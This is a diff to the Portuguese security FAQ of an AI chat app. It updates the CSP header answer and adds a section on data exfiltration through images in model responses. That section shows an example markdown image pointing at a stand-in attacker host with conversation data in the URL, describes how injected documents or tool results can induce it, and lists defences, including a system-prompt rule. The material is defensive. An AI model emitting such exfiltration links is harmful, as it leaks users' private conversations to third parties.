@@ -1,4 +1,4 @@
-<!-- i18n: source=docs/security-faq.md source-hash=f97d5d39b35d3639a1a1036f02047e0edaff6736 status=current -->
+<!-- i18n: source=docs/security-faq.md source-hash=359cc2fcbcadff6f29d96548321237ec3a527f5a status=current -->
 # FAQ de segurança do AI Prism
 
 [English](../security-faq.md) · **Português (Brasil)** · [Español](../es/security-faq.md)
@@ -263,27 +263,12 @@ não foi confirmada contra o repositório de confiança do runtime em um deploy 
 
 ### 15. A aplicação tem cabeçalhos de segurança (CSP, HSTS)?
 
-**Parcial (G6).** Em toda resposta o app define `X-Content-Type-Options: nosniff`,
-`Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` e
-`Permissions-Policy: microphone=(self), camera=()` (o microfone só para o ditado do próprio
-app), remove `X-Powered-By` e envia duas CSPs:
+**Sim para os cabeçalhos (G6); HSTS e TLS ficam com o proxy do Apps.** Em toda resposta o app define `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` e `Permissions-Policy: microphone=(self), camera=()` (o microfone só para o ditado do próprio app), remove `X-Powered-By` e envia duas CSPs:
 
-- **Aplicada**, conservadora: `frame-ancestors 'self'; base-uri 'self'; object-src 'none';
-  form-action 'self'` (`server/securityHeaders.ts`).
-- **Report-only**, a política alvo: `default-src 'self'; script-src 'self'; style-src 'self'
-  'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:;
-  frame-ancestors 'none'` (`server/middleware/security.ts`). O navegador não bloqueia nada
-  com ela; só reporta para `POST /api/csp-report`, que grava uma linha JSON por violação
-  com a diretiva, a origem bloqueada, o caminho do documento e a disposição, sem query
-  string, amostra nem identidade.
+- **Aplicada** (`server/securityHeaders.ts`): `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; default-src 'self'; script-src 'self' 'unsafe-inline'` mais as diretivas de saída `img-src`, `font-src`, `style-src`, `media-src`, `connect-src` e `frame-src` (o próprio app, `data:`, `blob:` e as origens que um admin permitiu para imagens, fontes e estilos). Vale desde a 2.0.0. `CSP_EGRESS=report` remove as diretivas de saída e de script (veja a [pergunta 21](#21-o-modelo-pode-vazar-dados-por-uma-imagem-ou-um-link-em-uma-resposta)).
+- **Report-only**, a política alvo mais estrita: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:; frame-ancestors 'none'` (`server/middleware/security.ts`). O navegador não bloqueia nada com ela; só reporta para `/api/csp-report`, que grava `csp_violation` com a diretiva e a origem bloqueada, nunca caminho nem query.
 
-A política alvo ainda não é aplicada porque os iframes `srcdoc` dos decks e dos previews de
-design system herdam a política da página e precisam de script inline e de assets do
-design system em outros hosts (motivo em [SECURITY.md](SECURITY.md#proteções-http)). Os
-relatórios coletados são a evidência necessária antes de aplicá-la. `Referrer-Policy` fica
-em `same-origin`, mais estrita que `strict-origin-when-cross-origin`: sites externos não
-recebem referrer nenhum. HSTS é do proxy do Apps; o que o proxy acrescenta na resposta não
-foi verificado (modelo de ameaças §7.1).
+O `script-src` mantém `'unsafe-inline'` porque os iframes `srcdoc` dos decks e dos previews de design system herdam a política da página e usam script inline. Um script remoto é bloqueado; script inline em um frame isolado não, então o WebRTC a partir desses frames segue aberto até que tenham origem própria (detalhes em [SECURITY.md](SECURITY.md#proteções-http)).
 
 ---
 
@@ -369,3 +354,22 @@ Não abra issue pública com detalhes técnicos.
   tabela e todas as entradas.
 
 *Plataforma:* a mesma criptografia, residência e backup do Lakebase que o resto dos dados.
+
+---
+
+### 21. O modelo pode vazar dados por uma imagem ou um link em uma resposta?
+
+**Versões anteriores à 2.0.0: sim. Atualize para a 2.0.0.** O ataque: o texto que o modelo escreve (induzido por um documento, uma página web ou um resultado de ferramenta que ele leu) contém `![x](https://atacante.example/p.png?d=<parte da conversa>)`. O navegador carrega a imagem sozinho, sem clique, e o servidor do atacante recebe a query string. O mesmo vale para uma imagem, fonte ou folha de estilo remota em um documento ou slide, e para uma chamada de ferramenta cujos argumentos carregam os dados.
+
+O que a 2.0.0 faz, em camadas (cada uma segura se outra falhar):
+
+- **Navegador (CSP, aplicada por padrão).** Imagens, fontes, estilos, mídia, conexões e frames só carregam do próprio app, `data:` e `blob:`; scripts remotos são bloqueados. Um único cabeçalho cobre o texto em streaming, o histórico, documentos, slides de deck, o frame de exportação e a janela de impressão. Um admin pode permitir uma origem para imagens, fontes e estilos em Configurações > Administradores > *Origens externas de recursos* (sem novo deploy), ou `EXTERNAL_ASSET_ORIGINS` no `app.yaml`.
+- **Marcador.** Uma imagem externa em uma resposta do chat ou em um documento aparece como um marcador não interativo com o nome do host. Não há botão "carregar mesmo assim": o clique enviaria os dados.
+- **Sanitizador de decks, ao salvar e ao ler.** O HTML do slide perde manipuladores de evento, URLs `javascript:`, `<base>`, `<meta http-equiv>`, `<link>`, frames, formulários e `src`, `srcset`, `url()` e `@import` remotos. Ler um deck limpa também slides antigos e cópias de conversas, então nada precisa ser salvo de novo.
+- **Regra do `web_fetch`.** Só abre uma URL que o usuário digitou ou que um resultado de `web_search`/`web_fetch` listou. Uma URL que só o modelo escreveu, ou que veio de um resultado do Genie, de MCP ou de arquivo, é recusada.
+- **Regra no prompt de sistema.** O modelo é instruído a não colocar dados da conversa, de ferramentas ou de arquivos em uma URL. É uma dica, não uma barreira.
+- **Downloads de artefatos.** Imagens e exportações armazenadas são servidas com uma CSP de sandbox, `nosniff` e `attachment`, então abrir uma como página não executa nada.
+- **Logs.** `egress_blocked` (servidor) e `csp_violation` (navegador) registram a tentativa só com o host ([operations.md §6.17](operations.md#617-csp-de-saída-200-permitir-uma-origem-interruptor-de-emergência-ler-os-logs)).
+
+*Plataforma:* a política de rede serverless decide se a ferramenta Python alcança a internet; mantenha-a restritiva.
+*App:* tudo acima. *Não coberto:* uma ferramenta MCP externa que escreve ou publica, se um admin a habilitou (revise-as), e WebRTC a partir de script inline em frames isolados (previsto para a 2.x).
